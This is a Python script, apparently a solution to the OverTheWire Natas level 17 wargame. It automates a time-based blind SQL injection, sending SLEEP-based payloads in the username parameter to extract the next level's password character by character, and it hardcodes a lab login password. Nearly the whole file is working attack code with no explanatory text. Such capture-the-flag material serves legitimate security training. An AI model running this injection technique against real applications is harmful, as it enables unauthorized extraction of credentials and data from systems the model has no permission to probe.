#!/bin/bash python

import requests

pwd_len = 32

charset_0 = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
charset_1 = ''

target = 'http://natas17.natas.labs.overthewire.org'
PASS = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
auth=('natas17', PASS)
sleep_time = 5

for c in charset_0:
	username = 'natas18" AND IF(password LIKE BINARY "%%%c%%",SLEEP(%d), 1)#' % (c, sleep_time)
	r = requests.get(target, auth=auth, params={"username": username}
	)
	s = r.elapsed.total_seconds()
	if s >= sleep_time:
		charset_1 += c
		print ('Injecting: ' + charset_1.ljust(len(charset_0), '*'))

print ("")

password = ""
while len(password) != pwd_len:
	for c in charset_1:
		t = password + c
		username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, sleep_time)
		r = requests.get(target, auth=auth, params={"username": username}
		)
		s = r.elapsed.total_seconds()
		if s >= sleep_time:
			print ('Password: ' + t.ljust(pwd_len, '*'))
			password = t
			break
